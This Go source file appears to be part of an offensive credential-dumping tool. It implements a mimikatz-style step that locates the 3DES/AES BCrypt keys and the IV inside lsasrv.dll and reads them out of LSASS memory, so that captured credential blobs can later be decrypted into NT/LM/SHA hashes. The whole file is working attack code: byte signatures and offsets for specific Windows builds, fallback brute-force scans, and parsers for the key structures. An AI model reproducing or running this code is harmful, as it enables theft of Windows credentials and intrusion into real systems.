package commands

// LSASS BCrypt key discovery — Phase 2C-ii-b Step 1.
//
// Phase 2C-ii-a captured the encrypted credential blobs reachable from each
// LogonSession. To turn those into plaintext NT/LM/SHA hashes we need the two
// BCrypt key globals and the InitializationVector that lsasrv.dll uses inside
// LsaProtectMemory / LsaUnprotectMemory:
//
//   - h3DesKey  → KIWI_BCRYPT_HANDLE_KEY → KIWI_BCRYPT_KEY81 → 24-byte 3DES key
//                 Used when ciphertext.length is NOT a multiple of 16 (legacy
//                 fallback; rarely seen on Win10/11).
//   - hAesKey   → KIWI_BCRYPT_HANDLE_KEY → KIWI_BCRYPT_KEY81 → 32-byte AES key
//                 Used when ciphertext.length is a multiple of 16 (the modern
//                 path; what Win10/11 emits in practice).
//   - InitializationVector → 16 raw bytes used as the AES-CFB IV / 3DES-CBC IV.
//
// All three globals live in lsasrv.dll's writable data segment. mimikatz finds
// them by sigscanning a stable byte sequence inside
// LsaInitializeProtectedMemory_Internal and then resolving three RIP-relative
// MOV instructions whose disp32 fields point at the globals.
//
// This file owns the cross-platform half of that pipeline: the signature
// definition, the offset table, and the BCrypt key blob parser. Each piece is
// fully unit-testable on Linux against a synthetic page table. The Windows
// integration in hashdump_insitu_full_windows.go wires it to a live
// PROCESS_VM_READ handle.
//
// Phase 2C-ii-c will use the captured key bytes + IV to BCryptDecrypt /
// crypto/aes / crypto/des the ciphertext and parse the plaintext
// KIWI_MSV1_0_PRIMARY_CREDENTIAL into NT/LM/SHA hashes.

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"strings"
)

// LsaInitProtectedMemoryWin10W8Signature is the byte pattern bracketing the
// LsaInitializeProtectedMemory_Internal entry sequence on Win 10 1607+ /
// Win 11. Calibrated for Win 10 21H2 — Win 11 23H2 (matches Phase 2B's
// LogonSessionListSignature window).
//
// Pattern decoding (offsets within the matched 12-byte region):
//
//	+0  83 64 24 30 00       and dword ptr [rsp+30h], 0
//	+5  44 8B 4D D8          mov r9d, [rbp-28h]
//	+9  48 8B 0D ?? ?? ?? ?? mov rcx, [rip+disp32]   ← IV pointer load (last 3 bytes of pattern)
//
// The mov at +9 is the IV-loading instruction (length 7, disp32 at +3 within
// the instruction). h3DesKey and hAesKey are loaded earlier in the function
// body via similar 7-byte movs at fixed negative offsets relative to the
// pattern start.
const LsaInitProtectedMemoryWin10W8Signature = "83 64 24 30 00 44 8B 4D D8 48 8B 0D"

// lsaCryptoLayout describes where, relative to a sigscan match, the three
// RIP-relative MOV instructions that load IV / h3DesKey / hAesKey live.
//
// Convention: each *MovStart field is the offset (within the captured
// lsasrv.dll image, relative to the start of a sigscan match) of the FIRST
// byte of the corresponding `48 8B 0D ?? ?? ?? ??` mov instruction. All three
// movs are 7 bytes long with the disp32 field starting 3 bytes in. The Phase
// 2A `resolveRIPRelative(buf, instrStart, dispOffset, instrLen)` helper does
// the actual address arithmetic.
//
// Future Windows builds with shifted offsets should ship as additional
// layouts in this struct rather than mutating the calibrated constants.
type lsaCryptoLayout struct {
	Name             string // descriptive label for diagnostics
	Sign             string // mimikatz-style hex pattern (with `??` wildcards)
	IVMovStart       int    // signed offset to the IV mov, relative to sigscan match start
	H3DesKeyMovStart int    // signed offset to the h3DesKey mov
	HAesKeyMovStart  int    // signed offset to the hAesKey mov
	MovInstrLen      int    // total length of each mov (7 for `48 8B 0D + disp32`)
	MovDispOffset    int    // offset of disp32 inside each mov (3 for `48 8B 0D + disp32`)
	IVSize           uint32 // bytes to read from the IV global (16 for AES-CFB / 3DES-CBC)
}

// LsaCryptoWin10W8 is the LsaInitializeProtectedMemory layout used on
// Win 10 21H2 — Win 11 23H2 (the same range covered by LayoutWin10New). The
// negative offsets for h3DesKey / hAesKey were taken from mimikatz's
// kuhl_m_sekurlsa offset table for KULL_M_WIN_BUILD_10_1809+ and converted
// from the post-instruction RIP-base convention (mimikatz: {16, -57, -68})
// to mov-instruction-start convention by subtracting MovInstrLen (7):
//
//	IV:        post=+16  → movStart = +16 - 7 = +9   (last 3 bytes of the pattern)
//	h3DesKey:  post=-57  → movStart = -57 - 7 = -64
//	hAesKey:   post=-68  → movStart = -68 - 7 = -75
//
// Live test on Windows 11 23H2 is the calibration source of truth — if the
// resolved global addresses don't yield a tag-valid KIWI_BCRYPT_HANDLE_KEY,
// the offsets need to be recalibrated against the actual lsasrv.dll on that
// build.
var LsaCryptoWin10W8 = lsaCryptoLayout{
	Name:             "Win10_21H2_Win11_23H2",
	Sign:             LsaInitProtectedMemoryWin10W8Signature,
	IVMovStart:       9,
	H3DesKeyMovStart: -64,
	HAesKeyMovStart:  -75,
	MovInstrLen:      7,
	MovDispOffset:    3,
	IVSize:           16,
}

// LsaCryptoWin10_1607 is the LsaInitializeProtectedMemory layout for
// Win10 1607–1909 / Server 2016 / Server 2019 (builds 14393–18363).
// Pattern matches the canonical mimikatz PTRN_WIN6x_LsaInitializeProtectedMemory.
// The function body includes a `lea rax,[rbp-20h]` between the `and` and `mov r9d`
// that is not present in Win10 21H2+ builds.
//
// Offsets converted from mimikatz's post-disp32 convention to mov-start convention:
//   IV:       post=+16 → movStart = 16 - 3 = 13
//   h3DesKey: post=-57 → movStart = -57 - 3 = -60
//   hAesKey:  post=-68 → movStart = -68 - 3 = -71
var LsaCryptoWin10_1607 = lsaCryptoLayout{
	Name:             "Win10_1607_Server2019",
	Sign:             "83 64 24 30 00 48 8D 45 E0 44 8B 4D D8 48 8D 15",
	IVMovStart:       13,
	H3DesKeyMovStart: -60,
	HAesKeyMovStart:  -71,
	MovInstrLen:      7,
	MovDispOffset:    3,
	IVSize:           16,
}

// lsaCryptoLayouts lists all crypto layouts in preference order.
// captureLsaCrypto tries each until one matches and resolves.
var lsaCryptoLayouts = []lsaCryptoLayout{
	LsaCryptoWin10_1607,
	LsaCryptoWin10W8,
}

// lsaCryptoGlobals captures the LSASS-virtual addresses of the three globals
// LsaInitializeProtectedMemory wires into BCryptEncrypt / BCryptDecrypt.
type lsaCryptoGlobals struct {
	IVAddr       uintptr
	H3DesKeyAddr uintptr // address of the PVOID g_h3DesKey global (NOT of the BCrypt key blob)
	HAesKeyAddr  uintptr // address of the PVOID g_hAesKey global
}

// findLsaCryptoGlobals scans `lsasrvBytes` for the LsaInitializeProtectedMemory
// signature in `layout`, resolves the three RIP-relative MOVs, and returns the
// LSASS-virtual addresses of IV / h3DesKey / hAesKey.
//
// The returned key addresses are the addresses of the **PVOID globals**, not
// of the BCRYPT_KEY_HANDLE structures themselves. To get the actual key
// material, callers must:
//
//  1. ReadProcessMemory 8 bytes at *KeyAddr → that's the
//     KIWI_BCRYPT_HANDLE_KEY pointer.
//  2. Pass that pointer to readBcryptHandleKey → KIWI_BCRYPT_KEY81 pointer.
//  3. Pass that pointer to readBcryptKey81 → raw key bytes.
//
// The IV global is different: the address points directly at the 16-byte IV.
//
// Returns descriptive errors when the signature is missing (likely a Windows
// build the layout is not calibrated for) or any of the resolved RIP-relative
// targets fall outside the captured buffer.
func findLsaCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryptoLayout, reader ...lsassReader) (lsaCryptoGlobals, error) {
	pat, mask, err := parseHexPattern(layout.Sign)
	if err != nil {
		return lsaCryptoGlobals{}, fmt.Errorf("internal: bad LsaInitializeProtectedMemory signature: %w", err)
	}
	hit := findPattern(lsasrvBytes, pat, mask)
	if hit < 0 {
		return lsaCryptoGlobals{}, fmt.Errorf("LsaInitializeProtectedMemory signature %q not found in %d-byte lsasrv.dll image — Windows build may need a different layout", layout.Name, len(lsasrvBytes))
	}

	ivOff, _, ivOk := resolveRIPRelative(lsasrvBytes, hit+layout.IVMovStart, layout.MovDispOffset, layout.MovInstrLen)
	desOff, _, desOk := resolveRIPRelative(lsasrvBytes, hit+layout.H3DesKeyMovStart, layout.MovDispOffset, layout.MovInstrLen)
	aesOff, _, aesOk := resolveRIPRelative(lsasrvBytes, hit+layout.HAesKeyMovStart, layout.MovDispOffset, layout.MovInstrLen)

	if !ivOk || !desOk || !aesOk {
		var r lsassReader
		if len(reader) > 0 {
			r = reader[0]
		}
		scanResult, scanErr := scanCryptoGlobals(lsasrvBytes, lsasrvBase, hit, len(pat), r)
		if scanErr != nil {
			return lsaCryptoGlobals{}, fmt.Errorf("LsaInitializeProtectedMemory %q: hardcoded offsets failed (iv=%v des=%v aes=%v at hit=%d) and scan failed: %w",
				layout.Name, ivOk, desOk, aesOk, hit, scanErr)
		}
		return scanResult, nil
	}

	return lsaCryptoGlobals{
		IVAddr:       lsasrvBase + uintptr(ivOff),
		H3DesKeyAddr: lsasrvBase + uintptr(desOff),
		HAesKeyAddr:  lsasrvBase + uintptr(aesOff),
	}, nil
}

type cryptoScanCandidate struct {
	instrOff  int
	targetOff int
	handlePtr uint64
	bits      uint32
}

// scanCryptoGlobals dynamically finds the three crypto global references near
// a LsaInitializeProtectedMemory pattern match. It scans for RIP-relative
// MOV/LEA instructions and validates candidates by checking for the BCrypt
// 'UUUR' handle tag via LSASS process memory reads.
//
// The scanner works bidirectionally: it scans backward 600 bytes and forward
// 200 bytes from the pattern to cover function bodies that were shifted by
// cumulative Windows updates (e.g., Server 2019 build 17763.3650 where
// mimikatz's hardcoded offsets are wrong).
func scanCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, hit, patLen int, reader lsassReader) (lsaCryptoGlobals, error) {
	bufLen := len(lsasrvBytes)

	// Scan forward from the pattern for the IV LEA instruction.
	var ivOff int
	ivFound := false
	fwdStart := hit + patLen - 7
	if fwdStart < hit {
		fwdStart = hit
	}
	for off := fwdStart; off < hit+50 && off+7 <= bufLen; off++ {
		if !isRIPRelativeMOVorLEA(lsasrvBytes, off) {
			continue
		}
		target, _, ok := resolveRIPRelative(lsasrvBytes, off, 3, 7)
		if !ok || target < 0 || target >= bufLen {
			continue
		}
		ivOff = target
		ivFound = true
		break
	}
	if !ivFound {
		return lsaCryptoGlobals{}, fmt.Errorf("no RIP-relative LEA/MOV found within 50 bytes after pattern at offset %d", hit)
	}

	// Scan both backward AND forward from the pattern for RIP-relative
	// MOV/LEA instructions whose targets are global variables containing
	// BCrypt handle pointers. The globals are in lsasrv.dll's .data section,
	// but the handles they point to are heap-allocated, so we validate by
	// reading through LSASS process memory.
	//
	// Scan ranges: 600 bytes backward, 200 bytes forward from pattern end.
	// This covers the full LsaInitializeProtectedMemory function body even
	// when cumulative updates have shifted the instruction layout.
	var keyGlobals []cryptoScanCandidate
	seen := make(map[int]bool)

	// Data section heuristic: the .text section occupies the lower portion
	// of the PE image. Use bufLen/4 as the threshold to avoid filtering out
	// globals in DLLs with large code sections.
	dataSectionThreshold := bufLen / 4

	// Track rejected candidates for diagnostics
	type rejectedCandidate struct {
		instrOff  int
		targetOff int
		reason    string
	}
	var rejected []rejectedCandidate

	validateCandidate := func(off int) {
		if !isRIPRelativeMOVorLEA(lsasrvBytes, off) {
			return
		}
		target, _, ok := resolveRIPRelative(lsasrvBytes, off, 3, 7)
		if !ok || target < 0 || target+8 > bufLen {
			return
		}
		if seen[target] {
			return
		}
		seen[target] = true

		if target < dataSectionThreshold {
			rejected = append(rejected, rejectedCandidate{off, target, "below data section threshold"})
			return
		}

		globalAddr := lsasrvBase + uintptr(target)

		var handlePtrVal uint64
		var bits uint32
		if reader != nil {
			ptrBytes, err := reader.Read(globalAddr, 8)
			if err != nil || len(ptrBytes) < 8 {
				rejected = append(rejected, rejectedCandidate{off, target, fmt.Sprintf("read global failed: %v", err)})
				return
			}
			handlePtrVal = binary.LittleEndian.Uint64(ptrBytes)
			handleAddr := uintptr(handlePtrVal)
			if handleAddr == 0 || handleAddr < 0x10000 {
				rejected = append(rejected, rejectedCandidate{off, target, fmt.Sprintf("bad handle ptr: 0x%X", handleAddr)})
				return
			}
			handleBytes, err := reader.Read(handleAddr, uint32(bcryptHandleKeySize))
			if err != nil || len(handleBytes) < bcryptHandleKeySize {
				rejected = append(rejected, rejectedCandidate{off, target, fmt.Sprintf("read handle at 0x%X failed: %v", handleAddr, err)})
				return
			}
			tag := binary.LittleEndian.Uint32(handleBytes[bcryptHandleKeyTagOff : bcryptHandleKeyTagOff+4])
			if tag != bcryptHandleKeyTagWant {
				rejected = append(rejected, rejectedCandidate{off, target,
					fmt.Sprintf("tag mismatch at 0x%X: got 0x%08X, want UUUR (0x%08X)",
						handleAddr, tag, bcryptHandleKeyTagWant)})
				return
			}
			keyAddr := uintptr(binary.LittleEndian.Uint64(handleBytes[bcryptHandleKeyKeyOff : bcryptHandleKeyKeyOff+8]))
			if keyAddr != 0 && keyAddr >= 0x10000 {
				key81Bytes, err := reader.Read(keyAddr, bcryptHardKeyDataOff)
				if err == nil && len(key81Bytes) >= bcryptHardKeyDataOff {
					bits = binary.LittleEndian.Uint32(key81Bytes[0x18:0x1C])
				}
			}
			isDup := false
			for _, existing := range keyGlobals {
				if existing.handlePtr == handlePtrVal {
					isDup = true
					break
				}
			}
			if isDup {
				rejected = append(rejected, rejectedCandidate{off, target, fmt.Sprintf("duplicate handle ptr 0x%X", handlePtrVal)})
				return
			}
		}

		keyGlobals = append(keyGlobals, cryptoScanCandidate{off, target, handlePtrVal, bits})
	}

	// Pass 1: scan backward from pattern (600 bytes)
	scanBackStart := hit - 600
	if scanBackStart < 0 {
		scanBackStart = 0
	}
	for off := hit - 4; off >= scanBackStart; off-- {
		validateCandidate(off)
		if len(keyGlobals) >= 2 {
			break
		}
	}

	// Pass 2: scan forward from pattern end (200 bytes) if still need keys
	if len(keyGlobals) < 2 {
		fwdEnd := hit + patLen + 200
		if fwdEnd > bufLen-7 {
			fwdEnd = bufLen - 7
		}
		for off := hit + patLen; off < fwdEnd; off++ {
			validateCandidate(off)
			if len(keyGlobals) >= 2 {
				break
			}
		}
	}

	// Pass 3: data section brute-force scan if instruction-based scan
	// found < 2 keys. Scan the upper portion of lsasrv.dll for 8-byte
	// aligned values that look like heap pointers to UUUR-tagged BCrypt
	// key handles. This handles builds where the AES/3DES key globals
	// are not referenced by any instruction near the signature.
	if len(keyGlobals) < 2 && reader != nil {
		dataStart := bufLen * 3 / 4
		dataStart = dataStart &^ 7 // align to 8 bytes
		for off := dataStart; off+8 <= bufLen; off += 8 {
			if seen[off] {
				continue
			}
			ptrVal := binary.LittleEndian.Uint64(lsasrvBytes[off : off+8])
			handleAddr := uintptr(ptrVal)
			if handleAddr == 0 || handleAddr < 0x10000 || handleAddr > 0x7FFFFFFFFFFF {
				continue
			}
			handleBytes, err := reader.Read(handleAddr, uint32(bcryptHandleKeySize))
			if err != nil || len(handleBytes) < bcryptHandleKeySize {
				continue
			}
			tag := binary.LittleEndian.Uint32(handleBytes[bcryptHandleKeyTagOff : bcryptHandleKeyTagOff+4])
			if tag != bcryptHandleKeyTagWant {
				continue
			}
			isDup := false
			for _, existing := range keyGlobals {
				if existing.handlePtr == ptrVal {
					isDup = true
					break
				}
			}
			if isDup {
				continue
			}
			var bits uint32
			keyAddr := uintptr(binary.LittleEndian.Uint64(handleBytes[bcryptHandleKeyKeyOff : bcryptHandleKeyKeyOff+8]))
			if keyAddr != 0 && keyAddr >= 0x10000 {
				key81Bytes, err := reader.Read(keyAddr, bcryptHardKeyDataOff)
				if err == nil && len(key81Bytes) >= bcryptHardKeyDataOff {
					bits = binary.LittleEndian.Uint32(key81Bytes[0x18:0x1C])
				}
			}
			keyGlobals = append(keyGlobals, cryptoScanCandidate{off, off, ptrVal, bits})
			if len(keyGlobals) >= 2 {
				break
			}
		}
	}

	if len(keyGlobals) < 2 {
		dumpStart := hit - 200
		if dumpStart < 0 {
			dumpStart = 0
		}
		dumpEnd := hit + patLen + 50
		if dumpEnd > bufLen {
			dumpEnd = bufLen
		}
		hexDump := hex.EncodeToString(lsasrvBytes[dumpStart:hit])
		hexPost := hex.EncodeToString(lsasrvBytes[hit:dumpEnd])

		var rejParts []string
		for _, r := range rejected {
			rejParts = append(rejParts, fmt.Sprintf("instr@%d→off=%d: %s", r.instrOff, r.targetOff, r.reason))
		}
		rejStr := "none"
		if len(rejParts) > 0 {
			rejStr = strings.Join(rejParts, "; ")
		}
		return lsaCryptoGlobals{}, fmt.Errorf("found %d distinct BCrypt key globals (need 2) scanning hit=%d (back 600, fwd 200, data-section brute-force); found=[%s]; rejected=[%s]; pre-pattern hex (200B): %s; pattern+post hex: %s",
			len(keyGlobals), hit, formatValidatedKeys(keyGlobals, lsasrvBase), rejStr, hexDump, hexPost)
	}

	// Order by key size: 3DES (bits=168, 24 bytes) first, AES (bits=256, 32 bytes) second.
	// If bits info unavailable, keep discovery order (backward scan finds closest first).
	desIdx, aesIdx := 0, 1
	if len(keyGlobals) >= 2 {
		if keyGlobals[0].bits == 256 && keyGlobals[1].bits == 168 {
			desIdx, aesIdx = 1, 0
		}
	}

	return lsaCryptoGlobals{
		IVAddr:       lsasrvBase + uintptr(ivOff),
		H3DesKeyAddr: lsasrvBase + uintptr(keyGlobals[desIdx].targetOff),
		HAesKeyAddr:  lsasrvBase + uintptr(keyGlobals[aesIdx].targetOff),
	}, nil
}

func formatValidatedKeys(keys []cryptoScanCandidate, base uintptr) string {
	if len(keys) == 0 {
		return "none"
	}
	parts := make([]string, len(keys))
	for i, k := range keys {
		parts[i] = fmt.Sprintf("instr@%d→global@0x%X(off=%d,bits=%d,handle=0x%X)",
			k.instrOff, base+uintptr(k.targetOff), k.targetOff, k.bits, k.handlePtr)
	}
	return strings.Join(parts, ", ")
}

// isRIPRelativeMOVorLEA checks if the 3 bytes at `off` in `buf` form the
// start of a REX.W + MOV/LEA + ModRM(RIP-relative) instruction.
func isRIPRelativeMOVorLEA(buf []byte, off int) bool {
	if off < 0 || off+3 > len(buf) {
		return false
	}
	rex := buf[off]
	if rex != 0x48 && rex != 0x4C {
		return false
	}
	opcode := buf[off+1]
	if opcode != 0x8B && opcode != 0x8D && opcode != 0x89 {
		return false
	}
	modrm := buf[off+2]
	// mod=00, r/m=101 → RIP-relative: modrm & 0xC7 == 0x05
	return modrm&0xC7 == 0x05
}

// KIWI_BCRYPT_HANDLE_KEY layout (Win 10/11 x64). Reverse-engineered by
// gentilkiwi; the tag value is the magic number BCryptGenerateKeyHandle
// stamps on freshly allocated handles.
//
//	+0x00  DWORD  size
//	+0x04  DWORD  tag        ('UUUR' = 0x55555552 in memory: 'R','U','U','U')
//	+0x08  PVOID  hAlgorithm
//	+0x10  PVOID  key        ← KIWI_BCRYPT_KEY81 pointer
//	+0x18  PVOID  unk0
//	total                    32 bytes
const (
	bcryptHandleKeySize    = 32
	bcryptHandleKeyTagOff  = 4
	bcryptHandleKeyKeyOff  = 16
	bcryptHandleKeyTagWant = uint32(0x55555552) // 'UUUR'
)

// KIWI_BCRYPT_KEY81 layout (Win 10 1607+ / Win 11). The hardkey block at the
// tail contains the actual key bytes prefaced by a 4-byte cbSecret.
//
//	+0x00  DWORD  size
//	+0x04  DWORD  tag        ('MSSK' = 0x4D53534B in memory: 'K','S','S','M')
//	+0x08  DWORD  type
//	+0x0c  DWORD  unk0
//	+0x10  DWORD  unk1
//	+0x14  DWORD  unk2
//	+0x18  DWORD  unk3   (often the bit-length: 256 for AES-256, 192 for 3DES)
//	+0x1c  DWORD  unk4
//	+0x20  BYTE   unk5[16]
//	+0x30  DWORD  unk6
//	+0x34  DWORD  unk7
//	+0x38  DWORD  unk8
//	+0x3c  DWORD  unk9
//	+0x40  KIWI_HARD_KEY hardkey   { DWORD cbSecret; BYTE data[cbSecret]; }
const (
	bcryptKey81HeaderSize    = 0x40 // bytes before the embedded KIWI_HARD_KEY
	bcryptKey81TagOff        = 4
	bcryptKey81TagWant       = uint32(0x4D53534B) // 'MSSK'
	bcryptHardKeyCbSecretOff = 0x40              // DWORD cbSecret follows the header
	bcryptHardKeyDataOff     = 0x44              // BYTE  data[cbSecret] follows cbSecret
)

// bcryptKeySanityMaxBytes caps the cbSecret value at 256 bytes. AES-256 is 32,
// 3DES is 24; even ChaCha-style keys are well under 64. 256 catches a
// corrupted cbSecret without rejecting any legitimate Microsoft key length.
const bcryptKeySanityMaxBytes uint32 = 256

// bcryptHandleKey is the structured projection of KIWI_BCRYPT_HANDLE_KEY.
type bcryptHandleKey struct {
	Address     uintptr
	Size        uint32
	Tag         uint32
	HAlgorithm  uintptr
	KeyAddr     uintptr // address of the embedded KIWI_BCRYPT_KEY81
	TagValid    bool
}

// bcryptKey81 is the structured projection of KIWI_BCRYPT_KEY81 — the inner
// blob that holds the actual key material.
type bcryptKey81 struct {
	Address  uintptr
	Size     uint32
	Tag      uint32
	Type     uint32
	Bits     uint32 // unk3, often the bit length (256 for AES-256, 192 for 3DES)
	CbSecret uint32 // size of the trailing key data
	Key      []byte // CbSecret bytes of raw key material
	TagValid bool
}

// readBcryptHandleKey reads and parses a KIWI_BCRYPT_HANDLE_KEY at `addr`.
// Tag mismatches do NOT fatally fail — TagValid is reported false but the
// other fields are still surfaced so the operator can see the raw bytes and
// decide whether the layout is wrong vs. the address is bogus.
func readBcryptHandleKey(r lsassReader, addr uintptr) (bcryptHandleKey, error) {
	if r == nil {
		return bcryptHandleKey{}, fmt.Errorf("nil lsassReader")
	}
	if addr == 0 {
		return bcryptHandleKey{}, fmt.Errorf("zero KIWI_BCRYPT_HANDLE_KEY address")
	}
	raw, err := r.Read(addr, bcryptHandleKeySize)
	if err != nil {
		return bcryptHandleKey{}, fmt.Errorf("read KIWI_BCRYPT_HANDLE_KEY at 0x%X: %w", addr, err)
	}
	if len(raw) < bcryptHandleKeySize {
		return bcryptHandleKey{}, fmt.Errorf("short read at 0x%X: got %d, want %d", addr, len(raw), bcryptHandleKeySize)
	}
	hk := bcryptHandleKey{
		Address:    addr,
		Size:       binary.LittleEndian.Uint32(raw[0:4]),
		Tag:        binary.LittleEndian.Uint32(raw[bcryptHandleKeyTagOff : bcryptHandleKeyTagOff+4]),
		HAlgorithm: uintptr(binary.LittleEndian.Uint64(raw[8:16])),
		KeyAddr:    uintptr(binary.LittleEndian.Uint64(raw[bcryptHandleKeyKeyOff : bcryptHandleKeyKeyOff+8])),
	}
	hk.TagValid = hk.Tag == bcryptHandleKeyTagWant
	return hk, nil
}

// readBcryptKey81 reads and parses a KIWI_BCRYPT_KEY81 at `addr`, including
// the trailing KIWI_HARD_KEY whose `cbSecret`-byte payload is the actual key
// material. Returns the structured projection plus a copy of the key bytes
// (not aliased with the read buffer).
//
// Tag mismatches do NOT fail fatally; CbSecret > bcryptKeySanityMaxBytes does
// (corrupted cbSecret would otherwise drive an arbitrarily-large second read
// into LSASS).
func readBcryptKey81(r lsassReader, addr uintptr) (bcryptKey81, error) {
	if r == nil {
		return bcryptKey81{}, fmt.Errorf("nil lsassReader")
	}
	if addr == 0 {
		return bcryptKey81{}, fmt.Errorf("zero KIWI_BCRYPT_KEY81 address")
	}
	// Read the header + cbSecret in one shot. A second read collects the
	// trailing key bytes so the buffer doesn't need a worst-case allocation.
	hdr, err := r.Read(addr, bcryptHardKeyDataOff)
	if err != nil {
		return bcryptKey81{}, fmt.Errorf("read KIWI_BCRYPT_KEY81 header at 0x%X: %w", addr, err)
	}
	if len(hdr) < bcryptHardKeyDataOff {
		return bcryptKey81{}, fmt.Errorf("short read at 0x%X: got %d, want %d", addr, len(hdr), bcryptHardKeyDataOff)
	}

	k := bcryptKey81{
		Address:  addr,
		Size:     binary.LittleEndian.Uint32(hdr[0:4]),
		Tag:      binary.LittleEndian.Uint32(hdr[bcryptKey81TagOff : bcryptKey81TagOff+4]),
		Type:     binary.LittleEndian.Uint32(hdr[8:12]),
		Bits:     binary.LittleEndian.Uint32(hdr[0x18:0x1C]),
		CbSecret: binary.LittleEndian.Uint32(hdr[bcryptHardKeyCbSecretOff : bcryptHardKeyCbSecretOff+4]),
	}
	k.TagValid = k.Tag == bcryptKey81TagWant

	if k.CbSecret == 0 {
		return k, nil
	}
	if k.CbSecret > bcryptKeySanityMaxBytes {
		return k, fmt.Errorf("KIWI_HARD_KEY.cbSecret=%d exceeds sanity cap %d (tag=0x%08X valid=%v bits=%d addr=0x%X — likely wrong key pointer or layout)", k.CbSecret, bcryptKeySanityMaxBytes, k.Tag, k.TagValid, k.Bits, addr)
	}
	keyBytes, err := r.Read(addr+uintptr(bcryptHardKeyDataOff), k.CbSecret)
	if err != nil {
		return k, fmt.Errorf("read KIWI_HARD_KEY.data at 0x%X (%d bytes): %w", addr+uintptr(bcryptHardKeyDataOff), k.CbSecret, err)
	}
	if uint32(len(keyBytes)) < k.CbSecret {
		return k, fmt.Errorf("short read at 0x%X: got %d, want %d", addr+uintptr(bcryptHardKeyDataOff), len(keyBytes), k.CbSecret)
	}
	k.Key = make([]byte, k.CbSecret)
	copy(k.Key, keyBytes)
	return k, nil
}

// readBcryptKeyMaterial is the convenience wrapper Phase 2C-ii-b uses on the
// hot path:
//
//  1. globalAddr is the address of the PVOID g_h3DesKey or g_hAesKey global
//     (i.e. the disp32 target from findLsaCryptoGlobals).
//  2. Dereference 8 bytes there → KIWI_BCRYPT_HANDLE_KEY pointer.
//  3. Dereference into the handle → KIWI_BCRYPT_KEY81 pointer.
//  4. Dereference into the key → 24-byte 3DES or 32-byte AES key bytes.
//
// Returns the resolved BCrypt key blob along with a non-nil error if any
// step fails fatally. Tag-mismatch on either KIWI_BCRYPT_HANDLE_KEY or
// KIWI_BCRYPT_KEY81 is reported via the embedded TagValid flags rather than
// failing — operators triaging a layout mismatch want to see the bytes.
func readBcryptKeyMaterial(r lsassReader, globalAddr uintptr) (bcryptHandleKey, bcryptKey81, error) {
	if r == nil {
		return bcryptHandleKey{}, bcryptKey81{}, fmt.Errorf("nil lsassReader")
	}
	if globalAddr == 0 {
		return bcryptHandleKey{}, bcryptKey81{}, fmt.Errorf("zero global address")
	}
	// Step 1: dereference the global to get the KIWI_BCRYPT_HANDLE_KEY ptr.
	ptrBytes, err := r.Read(globalAddr, 8)
	if err != nil {
		return bcryptHandleKey{}, bcryptKey81{}, fmt.Errorf("read BCrypt key global at 0x%X: %w", globalAddr, err)
	}
	if len(ptrBytes) < 8 {
		return bcryptHandleKey{}, bcryptKey81{}, fmt.Errorf("short read at 0x%X: got %d, want 8", globalAddr, len(ptrBytes))
	}
	handleAddr := uintptr(binary.LittleEndian.Uint64(ptrBytes))
	if handleAddr == 0 {
		return bcryptHandleKey{}, bcryptKey81{}, fmt.Errorf("BCrypt key global at 0x%X holds NULL — LSASS hasn't initialized the key yet", globalAddr)
	}

	// Step 2: parse the KIWI_BCRYPT_HANDLE_KEY.
	hk, err := readBcryptHandleKey(r, handleAddr)
	if err != nil {
		return bcryptHandleKey{}, bcryptKey81{}, fmt.Errorf("KIWI_BCRYPT_HANDLE_KEY: %w", err)
	}
	if hk.KeyAddr == 0 {
		return hk, bcryptKey81{}, fmt.Errorf("KIWI_BCRYPT_HANDLE_KEY at 0x%X has NULL key pointer", handleAddr)
	}

	// Step 3: parse the KIWI_BCRYPT_KEY81.
	k, err := readBcryptKey81(r, hk.KeyAddr)
	if err != nil {
		return hk, k, fmt.Errorf("KIWI_BCRYPT_KEY81: %w", err)
	}
	return hk, k, nil
}

// readIVBytes fetches the InitializationVector raw bytes at ivAddr. Layout's
// IVSize controls the read length (16 for AES-CFB / 3DES-CBC). Returns a
// fresh slice owned by the caller.
func readIVBytes(r lsassReader, ivAddr uintptr, size uint32) ([]byte, error) {
	if r == nil {
		return nil, fmt.Errorf("nil lsassReader")
	}
	if ivAddr == 0 {
		return nil, fmt.Errorf("zero IV address")
	}
	if size == 0 || size > 64 {
		return nil, fmt.Errorf("implausible IV size %d (expected 1..64)", size)
	}
	bytes, err := r.Read(ivAddr, size)
	if err != nil {
		return nil, fmt.Errorf("read IV at 0x%X (%d bytes): %w", ivAddr, size, err)
	}
	if uint32(len(bytes)) < size {
		return nil, fmt.Errorf("short IV read at 0x%X: got %d, want %d", ivAddr, len(bytes), size)
	}
	out := make([]byte, size)
	copy(out, bytes)
	return out, nil
}
